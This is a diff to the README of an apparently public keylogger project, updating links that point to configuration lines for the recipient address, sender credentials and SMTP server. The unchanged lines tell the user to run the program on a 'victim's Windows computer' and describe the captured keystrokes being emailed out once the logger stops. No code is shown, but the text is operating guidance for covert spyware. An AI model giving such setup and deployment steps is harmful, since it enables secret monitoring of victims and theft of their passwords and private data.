@@ -14,10 +14,10 @@ Additionally, immediately after the keylogger is stopped, the script will email 
 
 **INSTRUCTIONS:**
 
- - [Specify recipient address](https://github.com/bmattblake/Cypher-Keylogger/blob/793d7e546a87f1633f19f37162d3c4046365cf16/.env#L1)
- - [Specify sender address](https://github.com/bmattblake/Cypher-Keylogger/blob/793d7e546a87f1633f19f37162d3c4046365cf16/.env#L1)
- - [Enter sender email address password](https://github.com/bmattblake/Cypher-Keylogger/blob/793d7e546a87f1633f19f37162d3c4046365cf16/.env#L2)
- - [Specify SMTP server](https://github.com/bmattblake/Keylogger/blob/8db61caec1a7e96b66d36d98b00b23b28ae7ff03/settings.py#L21)
+ - [Specify recipient address](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/.env#L1)
+ - [Specify sender address](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/.env#L1)
+ - [Enter sender email address password](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/.env#L2)
+ - [Specify SMTP server](https://github.com/bmattblake/Cypher-Keylogger/blob/629c4727a6d00e80ef2203577483726575b4c367/cypher/settings.py#L21)
  - Run the program on victim's Windows computer
  - Press [Left CTRL + F12] to stop the keylogger
 
